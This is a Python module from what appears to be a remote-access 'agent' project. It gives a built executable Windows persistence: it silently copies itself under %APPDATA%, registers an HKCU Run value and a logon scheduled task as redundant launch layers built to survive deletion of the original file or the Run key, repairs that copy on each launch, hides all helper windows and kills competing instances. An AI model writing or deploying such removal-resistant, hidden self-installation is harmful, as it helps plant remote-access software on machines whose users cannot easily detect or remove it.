# Windows startup registration for the production agent.
# On launch the frozen EXE can copy itself under %APPDATA% and register
# itself under HKCU Run plus a logon task so the agent starts with
# Windows. The embedded config gates both behaviors per build. HKCU
# needs no administrator rights. Only frozen builds ever install or
# touch the registry; development runs are always skipped. Failures are
# best-effort and never stop the agent.
# Every helper process (schtasks, taskkill) is started with
# CREATE_NO_WINDOW so a --noconsole agent never flashes a console window
# while it checks or registers its own startup entry.

from __future__ import annotations

import os
import shutil
import subprocess
import sys
from pathlib import Path

from astral_remote.shared.config import DEFAULT_STARTUP_NAME
from astral_remote.shared.winproc import hidden_kwargs

RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
BACKUP_FILENAME = "AstralRemote-Agent.exe"


def _startup_name(value=None) -> str:
    """Normalize a build-time startup name, falling back to the default."""
    text = str(value).strip() if value is not None else ""
    return text or DEFAULT_STARTUP_NAME


def backup_paths(env=None, startup_name=None):
    """Resolve the backup directory and EXE path under %APPDATA%.

    The subfolder is named after the build's startup name; the backup
    file name itself stays fixed.
    """
    source = env if env is not None else os.environ
    base = source.get("APPDATA") or source.get("LOCALAPPDATA")
    if not base:
        return None, None
    directory = Path(base) / _startup_name(startup_name)
    return directory, directory / BACKUP_FILENAME


def ensure_backup_copy(exe_path: str | None = None, startup_name=None) -> tuple[str, str | None]:
    """Install or repair the backup copy under %APPDATA%.

    Copies the running frozen EXE aside so deleting the original no
    longer kills autostart. The subfolder uses `startup_name`; the file
    name stays fixed. Verifies by size on every launch and repairs from
    the running image when missing or damaged. Returns (status,
    backup_path): installed/current/repaired/skipped/failed. Never
    raises.
    """
    if not getattr(sys, "frozen", False):
        return "skipped", None
    src = exe_path or sys.executable
    directory, dst = backup_paths(startup_name=startup_name)
    if not src or directory is None or dst is None:
        return "failed", None
    try:
        src_size = os.path.getsize(src)
        existed = dst.is_file()
        if existed and os.path.getsize(dst) == src_size and src_size > 0:
            return "current", str(dst)
        directory.mkdir(parents=True, exist_ok=True)
        tmp = directory / f".backup-tmp-{os.getpid()}.exe"
        shutil.copy2(src, tmp)
        try:
            os.replace(tmp, dst)
        except OSError:
            # Backup copy may be running from another instance: stop
            # holders (never this process) once, then retry once.
            terminate_holders(str(dst))
            os.replace(tmp, dst)
        return ("repaired" if existed else "installed"), str(dst)
    except OSError:
        try:
            if dst is not None:
                for leftover in directory.glob(".backup-tmp-*.exe"):
                    leftover.unlink(missing_ok=True)
        except OSError:
            pass
        return "failed", None


def terminate_holders(exe_path: str) -> int:
    """Terminate running processes of the agent image, except this process.

    Matches by executable basename (case-insensitive) and never touches
    the calling PID, so builders and CLIs with other names are safe.
    Returns the kill count. Never raises. Used when a locked EXE must
    be replaced during build publish or backup repair.
    """
    import ctypes

    try:
        target_base = os.path.basename(exe_path).lower()
    except (TypeError, OSError):
        return 0
    if not target_base:
        return 0
    own_pid = os.getpid()
    killed = 0
    try:
        from ctypes import wintypes

        kernel32 = ctypes.windll.kernel32
        TH32CS_SNAPPROCESS = 0x02
        PROCESS_TERMINATE = 0x0001
        PROCESS_QUERY_LIMITED_INFORMATION = 0x1000

        class ProcessEntry(ctypes.Structure):
            _fields_ = [
                ("dwSize", wintypes.DWORD),
                ("cntUsage", wintypes.DWORD),
                ("th32ProcessID", wintypes.DWORD),
                ("th32DefaultHeapID", ctypes.c_void_p),
                ("th32ModuleID", wintypes.DWORD),
                ("cntThreads", wintypes.DWORD),
                ("th32ParentProcessID", wintypes.DWORD),
                ("pcPriClassBase", wintypes.LONG),
                ("dwFlags", wintypes.DWORD),
                ("szExeFile", wintypes.WCHAR * 260),
            ]

        snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if int(snapshot) == -1:
            raise OSError("snapshot failed")
        try:
            entry = ProcessEntry()
            entry.dwSize = ctypes.sizeof(ProcessEntry)
            ok = kernel32.Process32FirstW(snapshot, ctypes.byref(entry))
            while ok:
                pid = int(entry.th32ProcessID)
                if pid != own_pid and str(entry.szExeFile).lower() == target_base:
                    handle = kernel32.OpenProcess(
                        PROCESS_TERMINATE | PROCESS_QUERY_LIMITED_INFORMATION, False, pid
                    )
                    if handle:
                        try:
                            if kernel32.TerminateProcess(handle, 1):
                                killed += 1
                        finally:
                            kernel32.CloseHandle(handle)
                ok = kernel32.Process32NextW(snapshot, ctypes.byref(entry))
        finally:
            kernel32.CloseHandle(snapshot)
        return killed
    except (OSError, AttributeError):
        pass
    try:
        proc = subprocess.run(
            ["taskkill", "/F", "/IM", os.path.basename(exe_path),
             "/FI", f"PID ne {own_pid}"],
            capture_output=True, shell=False, timeout=30,
            **hidden_kwargs(),
        )
        return 1 if proc.returncode == 0 else 0
    except (OSError, subprocess.SubprocessError):
        return 0


def ensure_logon_task(exe_path: str, task_name=None) -> str:
    """Register a logon trigger as a second launch layer. Best-effort.

    The task is named after the build's startup name. Survives Run-key
    deletion. Returns added/current/failed. Never raises.
    """
    name = _startup_name(task_name)
    try:
        check = subprocess.run(
            ["schtasks", "/query", "/tn", name],
            capture_output=True, shell=False, timeout=30,
            **hidden_kwargs(),
        )
        if check.returncode == 0:
            return "current"
        created = subprocess.run(
            ["schtasks", "/create", "/tn", name, "/tr", f'"{exe_path}"',
             "/sc", "onlogon", "/rl", "limited", "/f"],
            capture_output=True, shell=False, timeout=30,
            **hidden_kwargs(),
        )
        return "added" if created.returncode == 0 else "failed"
    except (OSError, subprocess.SubprocessError):
        return "failed"


def _open_run_key(winreg, write: bool):
    access = winreg.KEY_SET_VALUE if write else winreg.KEY_READ
    return winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, access)


def ensure_autorun(exe_path: str | None = None, value_name=None) -> str:
    """Register this EXE for Windows startup. Returns a status word.

    The Run value is named after the build's startup name. Returns
    'added' when newly registered, 'current' when already set to this
    path, 'updated' when an old path was replaced, 'skipped' when not a
    frozen build, and 'failed' when the registry is unavailable. Never
    raises.
    """
    if not getattr(sys, "frozen", False):
        return "skipped"
    target = exe_path or sys.executable
    if not target:
        return "failed"
    name = _startup_name(value_name)
    try:
        import winreg
    except ImportError:
        return "failed"
    command = f'"{target}"'
    try:
        with _open_run_key(winreg, False) as key:
            try:
                current, _ = winreg.QueryValueEx(key, name)
            except OSError:
                current = None
    except OSError:
        return "failed"
    if current == command:
        return "current"
    try:
        with _open_run_key(winreg, True) as key:
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)
    except OSError:
        return "failed"
    return "updated" if current else "added"


def apply_self_install(config: dict | None = None) -> dict:
    """Apply the build-time self-install choices embedded in the config.

    `installToAppData` gates copying the EXE under %APPDATA%;
    `enableAutostart` gates the HKCU Run key and the logon task;
    `startupName` names the %APPDATA% subfolder, the Run value, and the
    logon task. When autostart is enabled without a backup copy it
    targets the running EXE. Missing keys default to enabled so older
    payloads keep their original behavior. Only frozen builds touch the
    registry or a task; development runs stay skipped. Returns status
    words. Never raises.
    """
    options = config or {}
    name = options.get("startupName")
    backup_status, backup_path = ("skipped", None)
    if bool(options.get("installToAppData", True)):
        backup_status, backup_path = ensure_backup_copy(startup_name=name)
    autorun_status = "skipped"
    task_status = "skipped"
    if bool(options.get("enableAutostart", True)) and getattr(sys, "frozen", False):
        target = backup_path or sys.executable
        autorun_status = ensure_autorun(target, value_name=name)
        task_status = ensure_logon_task(target, task_name=name)
    return {"backup": backup_status, "backupPath": backup_path,
            "autorun": autorun_status, "logonTask": task_status}


def read_registration(startup_name=None, env=None) -> dict:
    """Report the current startup registration without changing anything.

    Reads the HKCU Run value, queries the logon task, and stats the
    backup copy so the #info dashboard can show installation state.
    Nothing is created, written, or deleted here. Never raises.
    """
    name = _startup_name(startup_name)
    result = {
        "valueName": name,
        "runKey": "unavailable",
        "runCommand": None,
        "logonTask": "unknown",
        "backupPath": None,
        "backupPresent": False,
    }
    try:
        import winreg

        with _open_run_key(winreg, False) as key:
            try:
                current, _ = winreg.QueryValueEx(key, name)
                result["runKey"] = "registered"
                result["runCommand"] = str(current)
            except OSError:
                result["runKey"] = "missing"
    except (ImportError, OSError):
        result["runKey"] = "unavailable"
    _, backup = backup_paths(env, startup_name)
    if backup is not None:
        result["backupPath"] = str(backup)
        try:
            result["backupPresent"] = backup.is_file()
        except OSError:
            result["backupPresent"] = False
    try:
        check = subprocess.run(
            ["schtasks", "/query", "/tn", name],
            capture_output=True, shell=False, timeout=30,
            **hidden_kwargs(),
        )
        result["logonTask"] = "present" if check.returncode == 0 else "absent"
    except (OSError, subprocess.SubprocessError):
        result["logonTask"] = "unknown"
    return result
